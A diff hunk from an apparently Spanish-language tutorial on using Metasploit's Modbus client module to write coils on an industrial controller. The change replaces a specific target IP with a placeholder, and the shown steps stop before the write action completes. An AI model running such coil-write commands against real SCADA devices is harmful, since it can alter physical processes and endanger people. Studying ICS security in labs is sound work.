@@ -166,7 +166,7 @@ msf6 auxiliary(scanner/scada/modbusclient) > run
 msf6 > use auxiliary/scanner/scada/modbusclient
 
 # 2. Configurar la IP del host y el identificador de estación
-msf6 auxiliary(scanner/scada/modbusclient) > set RHOSTS 10.197.4.77
+msf6 auxiliary(scanner/scada/modbusclient) > set RHOSTS IP
 msf6 auxiliary(scanner/scada/modbusclient) > set UNIT_ID 1
 
 # 3. Cambiar la acción a escritura de bobina única (WRITE_COIL)
